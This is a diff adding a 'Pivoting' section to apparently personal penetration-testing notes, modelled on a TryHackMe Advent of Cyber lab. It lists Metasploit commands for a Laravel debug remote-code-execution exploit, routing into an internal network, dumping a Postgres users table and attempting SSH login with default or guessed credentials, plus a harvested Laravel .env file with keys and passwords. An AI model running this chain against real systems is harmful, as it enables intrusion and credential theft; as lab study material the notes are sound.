@@ -184,6 +184,97 @@ run post/windows/manage/enable_rdp
 run autoroute -s 10.10.201.217 -n 255.255.255.0
 ```
 
+### Pivoting
+
+METASPLOIT Pivoting Example based on THM "Advent of Cyber 2022 Day 9: Pivoting"
+
+``` sh
+msfconsole
+use multi/php/ignition_laravel_debug_rce
+set rhost 10.10.118.168
+set verbose true
+set lhost 10.8.36.83
+show options
+run
+background
+sessions -u 1
+sessions
+sessions -i 2
+resolve webservice_database 	#(172.28.101.51)
+route add 172.28.101.51/32 2
+route add 172.17.0.1/32 2
+route print
+use auxiliary/scanner/postgres/postgres_schemadump
+run postgres://postgres:postgres@172.28.101.51/postgres
+use auxiliary/admin/postgres/postgres_sql
+run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
+use auxiliary/scanner/ssh/ssh_login
+run ssh://santa_username_here:p4$$w0rd@172.17.0.1
+
+
+use auxiliary/server/socks_proxy
+run srvhost=127.0.0.1 srvport=9050 version=4a
+curl --proxy socks4a://localhost:9050 http://10.10.118.168
+proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 10.10.118.168
+nmap -T4 -A -Pn 10.10.118.168
+
+
+use admin/postgres/postgres_sql
+run postgres://user:password@10.10.118.168/database_name sql='select version()'
+
+
+
+10.10.118.168
+
+APP_NAME=Laravel
+APP_ENV=local
+APP_KEY=base64:NEMESCXelEv2iYzbgq3N30b9IAnXzQmR7LnSzt70rso=
+APP_DEBUG=true
+APP_URL=http://localhost
+
+LOG_CHANNEL=stack
+LOG_LEVEL=debug
+
+DB_CONNECTION=pgsql
+DB_HOST=webservice_database
+DB_PORT=5432
+DB_DATABASE=postgres
+DB_USERNAME=postgres
+DB_PASSWORD=postgres
+
+BROADCAST_DRIVER=log
+CACHE_DRIVER=file
+QUEUE_CONNECTION=sync
+SESSION_DRIVER=file
+SESSION_LIFETIME=120
+
+REDIS_HOST=127.0.0.1
+REDIS_PASSWORD=null
+REDIS_PORT=6379
+
+MAIL_MAILER=smtp
+MAIL_HOST=smtp.mailtrap.io
+MAIL_PORT=2525
+MAIL_USERNAME=null
+MAIL_PASSWORD=null
+MAIL_ENCRYPTION=null
+MAIL_FROM_ADDRESS=null
+MAIL_FROM_NAME="${APP_NAME}"
+
+AWS_ACCESS_KEY_ID=
+AWS_SECRET_ACCESS_KEY=
+AWS_DEFAULT_REGION=us-east-1
+AWS_BUCKET=
+
+PUSHER_APP_ID=
+PUSHER_APP_KEY=
+PUSHER_APP_SECRET=
+PUSHER_APP_CLUSTER=mt1
+
+MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
+MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
+```
+
 ## WiFi
 
 ### Aircrack-NG suite
